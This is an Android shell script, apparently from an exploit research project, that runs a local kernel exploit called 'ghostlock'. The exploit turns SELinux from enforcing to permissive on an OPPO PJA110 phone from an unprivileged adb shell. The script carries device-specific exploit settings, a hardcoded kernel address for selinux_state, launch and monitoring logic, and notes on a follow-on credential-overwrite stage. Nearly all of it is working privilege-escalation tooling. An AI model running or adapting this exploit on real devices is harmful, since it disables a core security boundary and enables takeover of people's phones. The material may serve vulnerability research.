#!/system/bin/sh
# W1: SELinux enforcing -> permissive on the OPPO PJA110, from uid 2000 shell,
# with no root and no KSU.
#
# This is the one configuration that has landed on hardware; see
# docs/analysis/device-gates/CPP20-20260925-w1-selinux-pass.md.
#   route=3 MulticastWaiter, mcast_waiter_off=32, tcp6 carrier,
#   profile = dev-profiles/gl-w1-profile.bin (kernel_phys_load=0 -> falls back to
#   the compiled-in P0_KERNEL_PHYS_LOAD=0xa8000000, which makes the alias of
#   selinux_state resolve to 0xffffff802b3f9990 on this build).
#
# Usage (from adb shell or a device terminal):
#   sh /data/local/tmp/gl-w1/w1.sh              # background: start, wait for the
#                                               # store, print the result, EXIT
#   sh /data/local/tmp/gl-w1/w1.sh --foreground # block here instead (old behaviour)
#   sh /data/local/tmp/gl-w1/w1.sh --status     # just report state, run nothing
#
# The script itself returns; the exploit process must stay alive.  It parks after
# the store ("parking after W1 ... do NOT exit/kill this process") because the
# kernel's exit-time PI/futex cleanup over the forged waiter wedges the machine.
#
# WARNINGS -- each measured, not assumed:
#   * --profile MUST be an absolute path.  The loader opens the string as-is and
#     the runtime rewrites HOME, so a relative path fails with
#     "cannot load resolved profile" even for a perfectly valid GLK1 file.
#   * Do NOT kill the parked process (see above); a reboot is the clean way out.
#   * The effect is NOT persistent: a reboot restores Enforcing.
#   * On this handset the platform reacts to this activity (observed: the system
#     was restarted shortly after a landing).  W2 (cred write) needs an explicit
#     decision -- never run it just because W1 worked.

DIR=/data/local/tmp/gl-w1
LOG="$DIR/w1.log"
MODE=background

case "$1" in
    --foreground) MODE=foreground ;;
    --status)     MODE=status ;;
    "")           ;;
    *) echo "usage: $0 [--foreground|--status]"; exit 2 ;;
esac

if [ "$MODE" = "status" ]; then
    echo "enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce 2>/dev/null))"
    ps -A 2>/dev/null | grep ghostlock
    [ -f "$LOG" ] && { echo "--- $LOG (tail) ---"; tail -3 "$LOG"; }
    exit 0
fi

cd "$DIR" || exit 1
export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_W1_ONLY=1
export GHOSTLOCK_PARK_AFTER_W1=1
export GHOSTLOCK_MCAST_SOCKET=tcp6

echo "W1: before: enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce))"
echo "W1: target alias is printed below as 'W1: SELinux target=...'"

if [ "$MODE" = "foreground" ]; then
    exec ./ghostlock --profile "$DIR/profile.bin"      # blocks; parks after W1
fi

rm -f "$LOG"
# The exploit writes to a *file*, not a pipe: if the terminal (or the adb session)
# disappears mid-run, a pipe would give the exploit EPIPE/SIGPIPE, and this process
# must never die on its own.  The screen mirror is done here by tailing the file,
# so the log is visible live AND lands in $LOG for the record.
setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
PID=$!
echo "W1: started pid=$PID -- log echoed below (also kept in $LOG)"

seen=0
i=0
while [ $i -lt 90 ]; do                # 90 * 1s, the store takes ~11s
    total=$(wc -l < "$LOG" 2>/dev/null)
    [ -z "$total" ] && total=0
    if [ "$total" -gt "$seen" ]; then
        tail -n +$((seen + 1)) "$LOG"
        seen=$total
    fi
    if grep -q "Write 1 complete" "$LOG" 2>/dev/null; then
        echo "W1: LANDED -- enforce=$(getenforce) ($(cat /sys/fs/selinux/enforce 2>/dev/null))"
        echo "W1: parked process is pid=$PID; do NOT kill it (a reboot is the clean exit)"
        exit 0
    fi
    if [ "$i" -gt 5 ] && ! kill -0 "$PID" 2>/dev/null; then
        echo "W1: process exited WITHOUT landing -- last log lines:"
        tail -6 "$LOG"
        exit 1
    fi
    sleep 1
    i=$((i + 1))
done

echo "W1: still running after 90s (pid=$PID); see $LOG"
exit 2
